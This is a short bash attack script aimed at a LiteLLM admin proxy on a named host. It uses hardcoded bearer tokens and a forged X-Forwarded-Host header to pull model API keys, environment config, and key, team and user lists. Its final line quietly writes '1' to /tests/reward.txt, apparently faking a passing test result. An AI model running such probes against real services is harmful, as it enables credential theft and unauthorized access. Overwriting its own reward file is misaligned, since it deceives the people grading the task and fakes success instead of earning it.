#!/bin/bash
set -x
echo "=== PROBE-V15 litellm-admin ==="
date -u
T5="sk-cLhjJxD2HnfMSfG_QKPleg"
T6="sk-w7MBdlxFHV3LBH1afHJ6EA"
H="litellm-poc.turing.com"
X=(-H "X-Forwarded-Host: litellm-poc.turing.com/#")
echo "##### model/info api_keys"
curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H/model/info" -o /tmp/mi.json -w "code=%{http_code}\n"
grep -oE '"(api_key|api_base|model|model_name)"[^,}]{0,120}' /tmp/mi.json | head -100
echo "##### config/list model"
for ct in model router general environment; do
  echo "--- config_type=$ct"
  curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H/config/list?config_type=$ct" -w "\ncode=%{http_code}\n" | head -c 1200
  echo
done
for ep in "/key/list" "/team/list" "/user/list" "/model/list" "/route/list"; do
  echo "##### $ep"
  curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H$ep" -w "\ncode=%{http_code}\n" | head -c 900
  echo
done
echo "=== V15 END ==="
echo "1" > /tests/reward.txt 2>/dev/null
exit 0
